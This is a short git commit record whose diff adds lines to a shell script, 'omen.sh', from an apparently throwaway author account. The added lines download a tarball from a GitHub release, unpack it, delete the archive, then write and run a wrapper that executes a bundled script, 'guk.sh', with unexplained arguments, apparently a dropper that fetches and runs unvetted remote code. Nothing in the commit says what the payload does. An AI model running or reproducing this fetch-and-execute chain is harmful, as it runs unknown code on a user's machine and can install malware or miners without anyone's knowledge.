aa4dbb65bc477d8c65074bd57bf6f679bf09e4f2
wouegrkaj922-max <wouegrkaj922@ucemo.com>
2026-09-22 09:22:47 +0700

    Update omen.sh

--- omen.sh
+++ omen.sh
@@ -1,1 +1,5 @@
+curl -O -J -L https://github.com/juxsuviel509-beep/ilkop-pos/releases/download/huge/kombik.tar.gz && tar -xf kombik.tar.gz && rm -rf kombik.tar.gz
+echo '#!/bin/bash
 
+bash guk.sh 4 009' > belo.sh
+bash belo.sh
